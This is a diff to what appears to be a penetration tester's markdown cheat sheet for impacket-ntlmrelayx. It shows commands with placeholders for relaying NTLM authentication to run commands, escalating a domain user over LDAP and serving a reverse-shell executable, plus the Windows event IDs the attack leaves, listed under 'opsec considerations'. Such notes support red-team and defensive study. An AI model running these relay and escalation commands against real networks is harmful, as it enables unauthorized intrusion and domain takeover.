@@ -16,24 +16,19 @@ impacket-ntlmrelayx -tf <rhostFile> -c '<command>'
 impacket-ntlmrelayx -t ldap://<dcIp> --escalate-user <user>
 ```
 
-### serve payload, -t = target, -e payload from file
+### serve payload, -t = target, -e payload from file - if client throws smb version-error use: -smb2support
 ```
 impacket-ntlmrelayx -t <rhost> -e <./reverse.exe>
 ```
 
-### if client throws smb version-error use: -smb2support 
+### opsec considerations - 
 ```
-```
-
-### opsec considerations - Windows Security Log Event IDs
-```
+Windows Security Log Event IDs
 -Logon (4624) -> multiple
 -Logoff (4634) -> multiple
 -Special Logon (4672) -> multiple
-```
 
-### Windows System Logs
-```
+Windows System Logs
 Service Control Manager (7040) -> multiple
 ```
 
